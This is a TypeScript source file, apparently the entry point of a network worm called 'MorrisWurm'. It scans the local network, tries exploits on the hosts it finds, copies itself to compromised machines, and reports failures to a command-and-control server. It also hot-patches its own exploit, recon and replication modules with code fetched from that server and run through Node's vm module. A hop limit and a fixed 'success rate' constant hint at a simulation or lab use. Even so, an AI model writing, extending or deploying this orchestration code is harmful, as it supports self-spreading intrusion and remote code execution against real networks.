import * as recon from './modules/recon.js';
import * as exploit from './modules/exploit.js';
import * as replication from './modules/replication.js';
import { reportFailure } from './modules/c2.js';
import { generateKey, rotateKey } from './modules/crypto.js';
import { initializeConnector } from './modules/connector.js';
import { logger } from './utils/logger.js';
import vm from 'vm';

const EXPLOIT_SUCCESS_RATE = 0.3; // 30% chance of success

const applyMutation = (mutatedCode: string | null): void => {
    if (!mutatedCode) {
        return;
    }
    try {
        logger.info('Module [Mutation]: Applying new code received from C2...');

        const sandbox = {
            logger: {
                info: (msg: string) => logger.info(msg),
                warn: (msg: string) => logger.warn(msg),
                error: (msg: string) => logger.error(msg),
            },
            setTimeout,
        };
        const context = vm.createContext(sandbox);

        const patchableModules: { [key: string]: any } = {
            exploit,
            recon,
            replication,
        };

        const script = new vm.Script(`(${mutatedCode})`);
        const newImplementationsByModule = script.runInContext(context);

        for (const moduleName in newImplementationsByModule) {
            if (Object.prototype.hasOwnProperty.call(patchableModules, moduleName)) {
                const moduleToPatch = patchableModules[moduleName];
                const functionPatches = newImplementationsByModule[moduleName];
                Object.assign(moduleToPatch, functionPatches);
                logger.info(`Module [Mutation]: Successfully applied live patch to module: '${moduleName}'.`);
            } else {
                logger.warn(`Module [Mutation]: Received patch for unknown or un-patchable module: '${moduleName}'.`);
            }
        }

    } catch (e: any) {
        logger.error(`Module [Mutation]: Failed to apply mutation: ${e.message}`);
    }
};

async function main(): Promise<void> {
    logger.info(`MorrisWurm slithering awake... [PID: ${process.pid}]`);
    initializeConnector(applyMutation);

    const BOOTSTRAP_KEY = process.env.BOOTSTRAP_KEY;
    let currentKey: string;

    if (BOOTSTRAP_KEY && /^[0-9a-fA-F]{64}$/.test(BOOTSTRAP_KEY)) {
        currentKey = BOOTSTRAP_KEY;
        logger.info('Initialized session key from BOOTSTRAP_KEY environment variable.');
    } else {
        if (BOOTSTRAP_KEY) {
            logger.warn('BOOTSTRAP_KEY environment variable is invalid (must be 64 hex characters). Generating a new random key.');
        }
        currentKey = generateKey();
    }
    
    let hopCount = 0;
    const TTL_HOPS = 20;
    let failureCount = 0;

    while (hopCount < TTL_HOPS) {
        const targets = await recon.scanLocalNet();
        for (const target of targets) {
            try {
                if (await exploit.attemptExploit(target, currentKey, EXPLOIT_SUCCESS_RATE)) {
                    await replication.selfReplicate(target);
                    hopCount++;
                    logger.info(`Successful hop! Count is now ${hopCount}.`);
                } else {
                    failureCount++;
                    const error = exploit.getLastError();
                    reportFailure({ ...error, targetIp: target.ip }, currentKey).catch(e => {
                        logger.error(`Error in background reportFailure call: ${e.message}`);
                    });
                    
                    if (failureCount > 0 && failureCount % 3 === 0) {
                        currentKey = rotateKey(currentKey);
                        logger.info(`Rotated session key after ${failureCount} cumulative failures.`);
                    }
                }
            } catch (err: any) {
                logger.error(`An error occurred in the main loop for target ${target.ip}: ${err.message}`);
                 reportFailure({ type: 'critical_error', details: err.message, targetIp: target.ip }, currentKey).catch(e => {
                    logger.error(`Error in background reportFailure call for critical error: ${e.message}`);
                });
            }
        }
        
        if (targets.length === 0) {
            logger.info('No targets found in this cycle. Waiting before next scan.');
        }

        logger.info(`Loop tick complete. Successful hops: ${hopCount}/${TTL_HOPS}. Cumulative failures: ${failureCount}.`);
        
        await new Promise(resolve => setTimeout(resolve, 5000));
    }

    logger.info(`TTL cap of ${TTL_HOPS} reached—poof`);
    process.exit(0);
}

main().catch(err => {
    logger.error('A fatal error occurred:', err);
    process.exit(1);
});
